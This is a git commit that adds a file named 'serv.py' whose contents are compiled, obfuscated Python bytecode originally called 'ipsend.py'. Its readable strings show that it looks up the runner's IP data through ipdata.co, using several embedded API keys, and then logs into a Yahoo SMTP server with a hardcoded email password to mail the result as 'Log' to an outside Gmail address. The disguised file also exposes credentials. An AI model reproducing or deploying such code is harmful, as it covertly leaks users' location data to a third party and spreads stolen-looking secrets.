1df322f98d274183654a0d3bf75cf28870608db3
Samarth Magdum (SM9) <101000624+HackerSM9@users.noreply.github.com>
2022-07-27 20:17:45 +0530

    Create serv.py

---
+++ src/serv.py
@@ -0,0 +1,12 @@
+o
+
+����–µb×��ã�������������������@���sx���d�dl�Z�d�dlZd�dlZdZdZg�d¢Ze e¡Ze e¡j	Z
+de
+�Ze� dd¡Z
+e
+ ¡��e
+ ee¡�e
+ ede¡�dS�)	é����Nzexamples0jk@yahoo.comZstcbaqzrlpmdnwnl)zWhttps://api.ipdata.co/?api-key=6818a70bf0dcdbf1dd6bf89e62299740a49725ac65ff8e4056e3b343zWhttps://api.ipdata.co/?api-key=7d9bf69a54c63b6f9274c6074b2f50aee46208d10a33533452add840zWhttps://api.ipdata.co/?api-key=6453632fcabd2a4c2de4bb45ab35254594fd719e61d58bacde4429f0zWhttps://api.ipdata.co/?api-key=6aed0320c458287bdc453ce543c6edc565fd098eda4a79f7e41b3b61zSubject: Log
+
+zsmtp.mail.yahoo.comiK��zmiguardzecurity@gmail.com)ZsmtplibZrequestsZrandomÚuserÚpwdZipdata_listÚchoiceZipdataÚgetÚtextÚbodyÚmessageZSMTPZserverZstarttlsZloginZsendmail©�r	���r	���ú	ipsend.pyÚ<module>���s����
+ý
